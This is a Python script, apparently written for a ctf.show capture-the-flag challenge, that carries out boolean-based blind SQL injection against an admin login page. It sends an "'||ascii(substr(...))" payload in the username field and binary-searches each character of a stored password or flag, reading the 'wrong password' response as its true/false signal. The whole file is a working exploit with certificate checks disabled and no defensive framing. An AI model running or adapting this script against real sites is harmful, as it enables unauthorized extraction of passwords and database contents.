import requests
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "http://11e1a8bc-90e8-4e16-9e45-2e44a4722d83.challenge.ctf.show/admin/checklogin.php"

# 可打印字符 ASCII 32-126
def get_char_by_binary_search(field, pos):
    low, high = 32, 126  # ASCII 可打印字符范围
    while low <= high:
        mid = (low + high) // 2
        payload = f"'||ascii(substr({field},{pos},1))<={mid}"
        data = {'u': payload, 'p': '1'}
        
        try:
            res = requests.post(url, data=data, timeout=5, verify=False)
            if "密码错误" in res.text:
                # 条件为真，说明字符 <= mid
                high = mid - 1
            else:
                # 条件为假，说明字符 > mid
                low = mid + 1
        except:
            return None
    return chr(low) if low <= 126 else None

session = requests.Session()
session.verify = False

# 先测试字段
field = 'p'  # 如果不对，改成 'flag'
flag = ""

print("[*] 开始二分法盲注...")
for i in range(1, 60):
    c = get_char_by_binary_search(field, i)
    if c is None or c == '\x7f':
        break
    flag += c
    print(f"[+] 第{i:2d}位: {c}  -> {flag}")
    if c == '}':
        break
    time.sleep(0.1)

print(f"\n[+] Flag: {flag}")
